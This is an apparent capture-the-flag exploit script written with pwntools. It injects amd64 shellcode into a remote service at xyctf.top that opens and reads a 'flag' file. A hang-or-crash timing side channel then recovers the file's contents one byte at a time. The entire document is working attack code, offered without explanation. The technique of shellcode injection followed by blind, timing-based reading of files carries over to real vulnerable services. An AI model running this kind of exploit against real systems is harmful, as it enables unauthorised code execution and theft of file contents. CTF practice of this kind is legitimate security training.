from pwn import *

context(os="linux", arch="amd64")
#context(log_level="debug")
context.terminal = ["qterminal", "-e"]
def exp(dis, char):
    shellcode = asm(shellcraft.openat("-100", "flag"))
    shellcode += asm(shellcraft.pread("rax", "rsp", 100, 0))
    # rsi
    shellcode += asm(
        """
        mov dl, byte ptr [rsi+{}]
        mov cl, {}
        cmp cl,dl
        jz loop
        push 1
        pop rsp
        jmp [rsp]
        loop:
        jmp loop
        """.format(
            dis, char
        )
    )
    p.sendline(shellcode)
'''
exp(1,109)
p.recv(timeout=1)
sleep(0.1)
'''

'''
try:
    exp(0,103)
    p.recv(timeout=1)
    sleep(0.1)
    p.sendline('1234')
    
    log.info("wcis")
except:
    log.info("mbot")
'''


flag=""
for i in range(30):
    sleep(0.5)
    for j in range(0x20,0x80):
        #p=process('./vuln')  
        p=remote('xyctf.top',59095)     
        try:            
            exp(i,j)
            p.recv(timeout=1)
            sleep(1)
            p.sendline('1234')
            flag += chr(j)
            log.success("{} pos : {} success".format(i,chr(j)))
            p.close()
            if(j==125):
                pause()
            break
        except: 
            log.info("not {}".format(j))        
            p.close()
log.success("flag : {}".format(flag))
